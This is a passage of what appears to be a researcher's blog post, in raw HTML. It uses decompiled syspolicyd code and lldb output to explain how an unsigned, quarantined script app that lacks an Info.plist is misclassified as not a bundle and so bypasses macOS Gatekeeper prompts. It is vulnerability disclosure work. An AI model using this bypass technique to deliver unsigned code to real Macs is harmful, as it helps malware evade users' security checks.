</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">=</span> r14;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>  <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3a</span>) <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  rax <span style="color:#f92672">=</span> os_log_impl(__mh_execute_header, r15, <span style="color:#ae81ff">0x0</span>, <span style="color:#e6db74">&#34;GK evaluateScanResult: %lu, %@, %d, %d, %d, %d, %lu, %d&#34;</span>, <span style="color:#f92672">&amp;</span>var_70, <span style="color:#ae81ff">0x3e</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>}</span></span></code></pre></div>
<p>From this, we can see the format string, <code>%lu, %@, %d, %d, %d, %d, %lu, %d</code>, will be populated with values such as a <code>PolicyScanTarget</code> (that was initialized to represent the evaluee, our PoC), whether the evaluee was quarantined (it was), was user approved (it was not), whether the evaluation completed successfully (it did), whether the evaluee was afforded a bypass (it was not), the results of an XProtect classification (7, unsigned code), and if it matched a policy (it did not).</p>
<p>Again to reiterate, the values in the log message (as a result of evaluating our allowed PoC) except for the first, exactly matched a log message when scanning the normal script-based application, <code>Script.app</code> which was blocked. So this implies they are likely irrelevant, or spurious in terms of tracking down the underlying reason why our unsigned, quarantined PoC was allowed.</p>
<p>So, what&rsquo;s the first value printed out (2 in the case of evaluating our PoC, 0 for the other application that were ultimated blocked). Turns out it was passed in to the <code>evaluateScanResult:</code> method as the value for the <code>withEvaluationType:</code> parameter (arg5, in <code>R9</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) po $r9
2
</pre>
</div>
<p>Thus we (now) know it represents an &ldquo;evaluation type&rdquo;.</p>
<p>Before we see how this value, the evaluation type, influences control flow and ultimately determines whether or not the evaluee should be allowed, let&rsquo;s keep working backwards to see where it came from, and why it&rsquo;s set to 0x2 (vs. 0x0).</p>
<p>An unnamed subroutine is responsible for calling the <code>evaluateScanResult: ... withEvaluationType:</code> method. It invokes this method with the return value from a <code>EvaluationPolicy</code> method called <code>determineGatekeeperEvaluationTypeForTarget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span> type <span style="color:#f92672">=</span> [r15 determineGatekeeperEvaluationTypeForTarget:r12 withResponsibleTarget:rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span> [[rdi evaluateScanResult:rdx withEvaluationArguments:rcx withPolicy:r8 withEvaluationType:type ...];</span></span></code></pre></div>
<p>The <code>determineGatekeeperEvaluationTypeForTarget:</code> method is invoked with the <code>PolicyScanTarget</code> object representing our evaluee and a <code>ProcessTarget</code> representing the responsible process (e.g. <code>/bin/sh</code>).</p>
<p>The method contains various checks upon the item represented in the <code>PolicyScanTarget</code> object. For example it first checks if the item is quarantined. If not, it simply returns. Obviously non-quarantined items can safely be allowed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span> rax <span style="color:#f92672">=</span> [policyScanTarget isQuarantined];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span> r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span> <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> leave;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>leave:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span> rax <span style="color:#f92672">=</span> r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span> <span style="color:#66d9ef">return</span> rax;</span></span></code></pre></div>
<p>Interestingly the return value is also 0x2. However, we know that our PoC was quarantined (and in a debugger, we can confirm this code path is not taken). So, onwards!</p>
<p>However, we then come across the following logic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span> <span style="color:#66d9ef">if</span> ([policyScanTarget isUserApproved] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   <span style="color:#66d9ef">if</span> ([policyScanTarget isScript] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>   
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>   r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>   <span style="color:#66d9ef">if</span> ([policyScanTarget isBundled] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> leave;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span> }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>leave:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span> rax <span style="color:#f92672">=</span> r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span> <span style="color:#66d9ef">return</span> rax;</span></span></code></pre></div>
<p>This logic first checks if the <code>PolicyScanTarget</code> object representing our PoC has been user approved. As it has not, we enter the <code>if</code> statement. It then checks and exits the <code>if</code> statement if the item is <em>not</em> a script. Since our PoC is a script, the <code>isScript</code> method returns a non-zero value, and thus execution continues with a call to <code>isBundled</code>.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb)  
Process 138 stopped
->  0x1008b78b2 <+208>: callq  *0x48ae8(%rip)            ; objc_msgSend
    
(lldb) po $rdi
PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE)

(lldb) x/s $rsi
0x7fff7e1e046e: "isBundled"

(lldb) p (BOOL)[$rdi isBundled]
(BOOL) $1 = NO

</pre>
</div>
<p>The <code>isBundled</code> simply returns the value of the <code>bundled</code> instance variable of the <code>PolicyScanTarget</code> object. As it is not set <code>isBundled</code> returns zero, which (as shown above, well, and below) causes the <code>determineGatekeeperEvaluationTypeForTarget:</code> method to leave, returning with a 0x2:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>  r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  <span style="color:#66d9ef">if</span> ([policyScanTarget isBundled] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> leave;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>leave:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span> rax <span style="color:#f92672">=</span> r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span> <span style="color:#66d9ef">return</span> rax;</span></span></code></pre></div>
<p>&hellip;as we saw an 0x2 was (also) returned for non-quarantined items (which are then allowed) &hellip;this seems problematic!</p>
<p>Let&rsquo;s also run the normal script-based application (<code>Script.app</code>, which we know gets blocked) and see that in its case <code>isBundled</code> returns true, as shown in the debugger output below:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb)  
Process 138 stopped
->  0x1008b78b2 <+208>: callq  *0x48ae8(%rip)            ; objc_msgSend
    
(lldb) po $rdi
PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script)

(lldb) x/s $rsi
0x7fff7e1e046e: "isBundled"
(lldb) p (BOOL)[$rdi isBundled]
(BOOL) $117 = YES

</pre>
</div>
<p>&hellip;and thus for <code>Script.app</code>, the <code>determineGatekeeperEvaluationTypeForTarget:</code> eventually returns an evaluation type of <code>0x0</code>.</p>
<p>Hooray, we&rsquo;ve now identified a problematic difference in macOS&rsquo;s evaluation logic between our PoC (which is allowed), and a normal script-based application (which is blocked). The fact that macOS does not think our PoC is &ldquo;bundled&rdquo; (and returns a 0x2 for the evaluation type) is clearly a flaw. But why does it think that!?</p>
<p>Recall that earlier we noted the <code>bundled</code> instance variable was set via the following code (from <code>ExecManagerPolicy</code>&rsquo;s <code>evaluateCodeForUser:withPID: ...</code> method):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>rax <span style="color:#f92672">=</span> sub_10087606c(rbx, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    var_6C <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    var_6C <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>[policyScanTarget setIsBundled:var_6C <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>];</span></span></code></pre></div>
<p>Thus it appears the unnamed subroutine is the culprit!  We noted earlier that the subroutine is invoked with a path to the item to classify (as a bundle or not). As it&rsquo;s evaluating our PoC, this path will be <code>/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC</code>. Recall (and this proves to be important), our <code>PoC.app</code> is a bare-boned application that <em>does not</em> contain an <code>Info.plist</code> file!</p>
<p>The subroutine&rsquo;s first check is to see if the path contains a @&quot;.&quot;. If not, it simply returns 0.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ([rax containsString:<span style="color:#e6db74">@&#34;.&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> leave;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>leave:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span> var_B8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span> rax <span style="color:#f92672">=</span> [var_B8 autorelease];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span> <span style="color:#66d9ef">return</span> rax;</span></span></code></pre></div>
<p>This makes sense, a (application) bundle will have to have a folder named something like <code>foo.app</code>.</p>
<p>Next it splits the path into its components, which when analyzing our PoC application, will produce the following:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) po $rax
<__NSArrayM 0x7fc2a2d2d990>(
/,
Users,
patrick,
Downloads,
PoC.app,
Contents,
MacOS,
PoC
)

</pre>
</div>
<p>If there are no path components, it returns with 0x0. So far (still), so good.</p>
<p>It then iterates over each path component, invoking the <code>pathExtension</code> upon it, and checking the result. For any &ldquo;non-bundle&rdquo; directories (that have no path components), it will just move on to the next. Once it comes across the bundle directory (e.g. <code>PoC.app</code>) the <code>pathExtension</code> will return a non-nil value (e.g. <code>app</code>). The code continues then by splitting the (original) path again into components again, and creating array with only those components up and to an including the bundle directory:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) po $rax
<__NSArrayI_Transfer 0x7fc2a2d4b0c0>(
/,
Users,
patrick,
Downloads,
PoC.app
)

</pre>
</div>
<p>This is then joined back into a single path (e.g. <code>/Users/patrick/Downloads/PoC.app/</code>).</p>
<p>The code then calls into another subroutine, passing in potential (relative) locations for an <code>Info.plist</code> file. For example <code>Contents/Info.plist</code>, <code>Versions/Current/Resources/Info.plist</code>, or <code>Info.plist</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ( ((sub_100015829(rbx, <span style="color:#e6db74">@&#34;Contents/Info.plist&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>      (sub_100015829(rbx, <span style="color:#e6db74">@&#34;Versions/Current/Resources/Info.plist&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>      (sub_100015829(rbx, <span style="color:#e6db74">@&#34;Info.plist&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">goto</span> isBundle;</span></span></code></pre></div>
<p>This helper subroutine simply attempts to open such candidate files, and if found, checks for various keys (commonly found or required in an <code>Info.plist</code> file) such as <code>CFBundleIdentifier</code>, or <code>CFBundleExecutable</code>.</p>
<p>As our bare-bones <code>PoC.app</code> does <em>not</em> contain an <code>Info.plist</code> file, the code continues&hellip;</p>
<p>Next it checks if the item is an &ldquo;application wrapper&rdquo;, by invoking the <code>AppWrapper</code> class&rsquo;s <code>isAppWrapper:</code> method. This begins by appending the string <code>Wrapper</code> to the (potential) bundle directory. For our PoC this will be <code>/Users/patrick/Downloads/PoC.app/Wrapper</code> &hellip;it then checks if that file exists (which in the case of our <code>PoC</code> it does not).</p>
<p>As the <code>isAppWrapper:</code> method returns 0 (false), the code continues processing the remaining path components (<code>Contents</code>, <code>MacOS</code>, <code>PoC</code>), seeing if any have a path extension, and if so, have a candidate <code>Info.plist</code> file or is an &ldquo;App Wrapper&rdquo;. As none do, the subroutine returns 0 (false), as according to it&rsquo;s logic, our <code>PoC.app</code> (which does not have an <code>Info.plist</code> file) is not a bundle. Oops! ü•≤</p>
<p>No bundle means <code>isBundle</code> is set to 0x0 (false), which means that the <code>determineGatekeeperEvaluationTypeForTarget</code> method returns with an 0x2! (vs. a 0x0).</p>
<p>Let&rsquo;s wrap this all up by looking at what it means if evaluation type of 0x2 is returned and then passed to the <code>&quot;evaluateScanResult:withEvaluationArguments:withPolicy:withEvaluationType:withCodeEval:&quot;</code> method.</p>
<p>The <code>evaluateScanResult:withEvaluationArguments:withPolicy:withEvaluationType:withCodeEval:</code> method is rather massive (having over 200 control flow blocks). Triaging its log message strings and names of methods it invokes, we can see it is the arbiter, the final decision maker, on whether or not a prompt will be shown to the user. For example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> ([r14 presentPromptOfType:var_B0 options:var_C8 completion:rax] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    rax <span style="color:#f92672">=</span> os_log_impl(__mh_execute_header, rbx, <span style="color:#ae81ff">0x0</span>, 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>          <span style="color:#e6db74">&#34;Prompt shown (%ld, %#lx), waiting for response: %@&#34;</span>, <span style="color:#f92672">&amp;</span>var_70, <span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    dispatch_semaphore_wait(<span style="color:#f92672">*</span>(var_1A0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>), <span style="color:#ae81ff">0xffffffffffffffff</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}</span></span></code></pre></div>
<p>&hellip;and then handling the user&rsquo;s response to the alert, for example displaying the following message if the user clicks deny:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(var_170 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#66d9ef">goto</span> userBlocked;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>userBlocked:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#66d9ef">if</span> (os_log_type_enabled(rax, <span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>   var_70 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>   rax <span style="color:#f92672">=</span> _os_log_impl(__mh_execute_header, rbx, <span style="color:#ae81ff">0x0</span>, <span style="color:#e6db74">&#34;Blocking executable due to user not allowing&#34;</span>, <span style="color:#f92672">&amp;</span>var_70, <span style="color:#ae81ff">0x2</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>}</span></span></code></pre></div>
<div class="note">
The actual prompt is displayed by the CoreServicesUIAgent. Bidirectional communications between syspolicyd and this agent occur via XPC.
</div>
<p>In the case of our proof of concept, no alert is shown. Hence such logic is apparently skipped! Let&rsquo;s see how.</p>
<p>The evaluation type (set to the problematic value of 0x2, as the policy engine failed to correctly identify our PoC application as a bundle) is passed in as the sixth argument (<code>withEvaluationType:</code>). The disassembly notes this is then moved into a local variable (which we named <code>evalType</code>). As we previously noted this first passed to the <code>GK evaluateScanResult: %lu</code> string, which for our PoC generated <code>GK evaluateScanResult: 2, PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0</code></p>
<p>The first time it is explicitly checked is in an <code>if</code> statement, which specifically checks if it was set to 0x2:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (evalType <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#66d9ef">goto</span> notTwo;</span></span></code></pre></div>
<p>&hellip;as the <code>evalType</code> for our proof of concept application was set to 0x2, we don&rsquo;t take this jump, but continue on.</p>
<p>Next, it checks if the evaluee matches known malware (via a call to a method named <code>xProtectResultIsBlocked</code>). Of course our PoC does not, so onwards we go. Though there are several other checks, they all appear spurious, but regardless all logic related to showing an alert or prompt to the user is skipped. This bears repeating! Normal <code>syspolicyd</code> will send an XPC message to the <code>CoreServicesUIAgent</code> in order to alert the user that the application is disallowed (for example if it
s non-notarized), or even if signed and notarized a prompt requesting that the user explicitly approve the application. Here, all such logic is skipped, and no prompts or alerts are thus shown!</p>
<p>Before the <code>evaluateScanResult:withEvaluationArguments:withPolicy:</code> methods returns, it executes some code that explicitly sets the <code>R12</code> register to <code>0x1</code> (true). This is relevant as later this value is passed into the <code>EvalutionResult</code> object&rsquo;s setAllowed&rsquo; method:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>;true
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>r12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>; 
